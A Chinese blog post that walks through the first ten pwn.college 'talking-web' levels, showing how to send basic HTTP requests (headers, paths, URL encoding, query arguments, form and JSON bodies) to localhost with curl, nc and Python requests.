

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="voidchunk">
  <meta name="keywords" content="">
  
    <meta name="description" content="pwn.college，稍微写了几个版块，后边的先鸽了">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn.college">
<meta property="og:url" content="https://voidchunk.github.io/2024/09/01/pwn-college/index.html">
<meta property="og:site_name" content="voidchunk&#39;s blog">
<meta property="og:description" content="pwn.college，稍微写了几个版块，后边的先鸽了">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2024-09-01T05:58:23.000Z">
<meta property="article:modified_time" content="2025-03-15T16:30:17.401Z">
<meta property="article:author" content="voidchunk">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="WP">
<meta name="twitter:card" content="summary_large_image">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>pwn.college - voidchunk&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"voidchunk.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>voidchunk</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://github.com/voidchunk" target="_self">
                <i class="iconfont icon-github-fill"></i>
                <span>GitHub</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="pwn.college"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-09-01 13:58" pubdate>
          2024年9月1日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.9k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          33 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        

      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">pwn.college</h1>
            
              <p id="updated-time" class="note note-info" style="">
                
                  
                    本文最后更新于 2025年3月16日 凌晨
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>pwn.college，稍微写了几个版块，后边的先鸽了</p>
<span id="more"></span>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://pwn.college/">https://pwn.college</a></p>
</blockquote>
<h1 id="intro-to-cybersecurity"><a href="#intro-to-cybersecurity" class="headerlink" title="intro to cybersecurity"></a>intro to cybersecurity</h1><h2 id="talking-web"><a href="#talking-web" class="headerlink" title="talking-web"></a>talking-web</h2><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP是一个应用层协议</p>
<p>有关会话层的TCP、UDP协议，网络层的IP协议，数据链路层的以太网协议将会在pwn.college的<a href="#intercepting-communication">intercepting-communication</a>部分中提到</p>
<h4 id="HTTP-request"><a href="#HTTP-request" class="headerlink" title="HTTP request"></a>HTTP request</h4><p>下面是HTTP请求的主要结构</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">+-------------+----------------------------+------------------------------------------------+<br>|<span class="hljs-string">format       </span>|<span class="hljs-string">GET exapmle                 </span>|<span class="hljs-string">POST example                                    </span>|<br>+-------------+----------------------------+------------------------------------------------+<br>|<span class="hljs-string">request line </span>|<span class="hljs-string">GET /get?a=12&amp;b=34 HTTP/1.1 </span>|<span class="hljs-string">POST /post HTTP/1.1                             </span>|<br>|<span class="hljs-string">header       </span>|<span class="hljs-string">Host: httpbin.org           </span>|<span class="hljs-string">Host: httpbin.org                               </span>|<br>|<span class="hljs-string">header       </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">Content-Type: application/x-www-form-urlencoded </span>|<br>|<span class="hljs-string">header       </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">Content-Length: 9                               </span>|<br>|<span class="hljs-string">blank line   </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">                                                </span>|<br>|<span class="hljs-string">request data </span>|<span class="hljs-string">                            </span>|<span class="hljs-string">a=12&amp;b=34                                       </span>|<br>+-------------+----------------------------+------------------------------------------------+<br></code></pre></td></tr></table></figure>

<h3 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><blockquote>
<p>Send an HTTP request</p>
</blockquote>
<h5 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80</span><br></code></pre></td></tr></table></figure>

<h5 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br></code></pre></td></tr></table></figure>

<h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>response = requests.get(url)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><blockquote>
<p>Set the host header in an HTTP request</p>
</blockquote>
<h5 id="curl-1"><a href="#curl-1" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -H host:1c61bf39a9545b12f6fe638081f14f5c</span><br></code></pre></td></tr></table></figure>

<h5 id="nc-1"><a href="#nc-1" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET / HTTP/1.1<br>Host: c3b1fc17a0766e184c9af77b59799187<br></code></pre></td></tr></table></figure>

<h5 id="python-1"><a href="#python-1" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>host = <span class="hljs-string">&quot;9caff40ba2b50555593035fa83ddd063&quot;</span><br><br>headers = &#123;<br>        <span class="hljs-string">&quot;host&quot;</span>:host<br>&#125;<br><br>response = requests.get(url,headers=headers)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><blockquote>
<p>Set the path in an HTTP request</p>
</blockquote>
<h5 id="curl-2"><a href="#curl-2" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80/756549fa99c1d39df50fa0dbc7001b5b</span><br></code></pre></td></tr></table></figure>

<h5 id="nc-2"><a href="#nc-2" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /dff70448ab02fa153e53c321d12c3e25 HTTP/1.1<br></code></pre></td></tr></table></figure>

<h5 id="python-2"><a href="#python-2" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80/be21ae3ca3c57337269c87354f7fb58a&quot;</span><br><br>response = requests.get(url)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h4><blockquote>
<p>URL encode a path in an HTTP request</p>
</blockquote>
<h5 id="curl-3"><a href="#curl-3" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80/468d0524%20a0f46d01/13a2115f%2045f6bf42</span><br></code></pre></td></tr></table></figure>

<h5 id="nc-3"><a href="#nc-3" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /e834594f%20d12bbc07/45b1bdd9%2077ad1aa4 HTTP/1.1<br></code></pre></td></tr></table></figure>

<h5 id="python-3"><a href="#python-3" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>base_url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>path = <span class="hljs-string">&quot;/e1467bf6 1173372a/0d30c414 6d22c249&quot;</span><br>url = base_url + quote(path)<br><br>response = requests.get(url)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h4><blockquote>
<p>Specify an argument in an HTTP request</p>
</blockquote>
<h5 id="curl-4"><a href="#curl-4" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80/?a=21c2593a91c22ea996d92149d6ee1310</span><br></code></pre></td></tr></table></figure>

<h5 id="nc-4"><a href="#nc-4" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /?a=0c59ad68454000d755026a99dadaa303 HTTP/1.1<br></code></pre></td></tr></table></figure>

<h5 id="python-4"><a href="#python-4" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br><br>a = <span class="hljs-string">&quot;1d4f071509297083549435a7d5c7e650&quot;</span><br>params = &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:a<br>&#125;<br>params = urlencode(params)<br><br>response = requests.get(url,params=params)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h4><blockquote>
<p>Specify multiple arguments in an HTTP request</p>
</blockquote>
<h5 id="curl-5"><a href="#curl-5" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -v -G --data-urlencode <span class="hljs-string">&#x27;a=b40ff87c1dfc9445e66bd1dffd31ecf3&#x27;</span> --data-urlencode <span class="hljs-string">&#x27;b=e9e53eab 8cccb234&amp;d985bc70#d49f0c63&#x27;</span> 127.0.0.1:80</span><br></code></pre></td></tr></table></figure>

<h5 id="nc-5"><a href="#nc-5" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>GET /?a=01df1fb634dda7a5f27c6c54d072b51d&amp;b=de8950c2%20d91fa17a%2678fc768c%23e848a330 HTTP/1.1<br></code></pre></td></tr></table></figure>

<h5 id="python-5"><a href="#python-5" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlencode<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a=<span class="hljs-string">&quot;7afab61dacb0fca25609fedd696bce30&quot;</span><br>b=<span class="hljs-string">&quot;bb179fab e02b7f2f&amp;3a717740#2fb93639&quot;</span><br><br>params = &#123;<br>    <span class="hljs-string">&quot;a&quot;</span>:a,<br>    <span class="hljs-string">&quot;b&quot;</span>:b<br>&#125;<br>params = urlencode(params)<br><br>response = requests.get(url,params=params)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h4><blockquote>
<p>Include form data in an HTTP request</p>
</blockquote>
<h5 id="curl-6"><a href="#curl-6" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -d <span class="hljs-string">&quot;a=d59caa292e43dd969de6c0d6adebd053&quot;</span></span><br></code></pre></td></tr></table></figure>

<h5 id="nc-6"><a href="#nc-6" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 34<br><br>a=0a849ab7d1b57ed2f864880911873622<br></code></pre></td></tr></table></figure>

<h5 id="python-6"><a href="#python-6" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a = <span class="hljs-string">&#x27;ab3f0e720c694b54bf8fb2e2c4e6c6f5&#x27;</span><br>data = &#123;<span class="hljs-string">&#x27;a&#x27;</span>:a&#125;<br><br>response = requests.post(url,data)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h4><blockquote>
<p>Include form data with multiple fields in an HTTP request</p>
</blockquote>
<h5 id="curl-7"><a href="#curl-7" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -d <span class="hljs-string">&quot;a=a4431e83e83cae7723c24b83f465475e&quot;</span> --data-urlencode <span class="hljs-string">&quot;b=6100a2f0 e8809d07&amp;587a0ea8#9b1109cd&quot;</span></span><br></code></pre></td></tr></table></figure>

<h5 id="nc-7"><a href="#nc-7" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 78<br><br>a=b0f2f1b6f49b2896213fb29b3b93a1ef&amp;b=57792821%20bc13e5dc%261426d3c1%23972f7bb8<br></code></pre></td></tr></table></figure>

<h5 id="python-7"><a href="#python-7" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a = <span class="hljs-string">&#x27;0b39bf04e5ff6e32c942117af11502ef&#x27;</span><br>b = <span class="hljs-string">&#x27;3856a81d 06f783f6&amp;494c9950#b7a38f82&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>:a,<br>    <span class="hljs-string">&#x27;b&#x27;</span>:b<br>&#125;<br><br>response = requests.post(url,data)<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h4><blockquote>
<p>Include json data in an HTTP request</p>
</blockquote>
<h5 id="curl-8"><a href="#curl-8" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -H <span class="hljs-string">&#x27;Content-Type:application/json&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;a&quot;:&quot;547135c945b35920ab6b764faba0467c&quot;&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure>

<h5 id="nc-8"><a href="#nc-8" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/json<br>Content-Length: 40<br><br>&#123;&quot;a&quot;:&quot;506924275dda4823072f030cb9e36878&quot;&#125;<br></code></pre></td></tr></table></figure>

<h5 id="python-8"><a href="#python-8" class="headerlink" title="python"></a>python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:80&quot;</span><br>a = <span class="hljs-string">&#x27;b152f0359ac06459241c8d57bcf2a8cb&#x27;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;a&#x27;</span>:a,<br>&#125;<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;application/json&#x27;</span><br>&#125;<br><br>response = requests.post(url,headers = headers,data=json.dumps(data))<br><br><span class="hljs-built_in">print</span>(response.content)<br></code></pre></td></tr></table></figure>

<h4 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h4><blockquote>
<p>Include complex json data in an HTTP request</p>
</blockquote>
<h5 id="curl-9"><a href="#curl-9" class="headerlink" title="curl"></a>curl</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl 127.0.0.1:80 -H <span class="hljs-string">&#x27;Content-Type:application/json&#x27;</span> -d <span class="hljs-string">&#x27;&#123;&quot;a&quot;:&quot;afb674d6a6635008d8f123b6db1c7fe1&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;eaa06025&quot;,&quot;d&quot;:[&quot;f3e76d78&quot;,&quot;8897c850 15e64e19&amp;86faa062#707120a5&quot;]&#125;&#125;&#x27;</span></span><br></code></pre></td></tr></table></figure>

<h5 id="nc-9"><a href="#nc-9" class="headerlink" title="nc"></a>nc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nc 127.0.0.1 80</span><br>POST / HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/json<br>Content-Length: 116<br><br>&#123;&quot;a&quot;:&quot;e0e3ffb1ea8c041f948fd4a52b8b03ef&quot;,&quot;b&quot;:&#123;&quot;c&quot;:&quot;07027b1c&quot;,&quot;d&quot;:[&quot;9caee2fb&quot;,&quot;40d89ef2 c4b79a11&amp;7fa007c8#ccf64a5f&quot;]&#125;&#125;<br></code></pre></td></tr></table></figure>

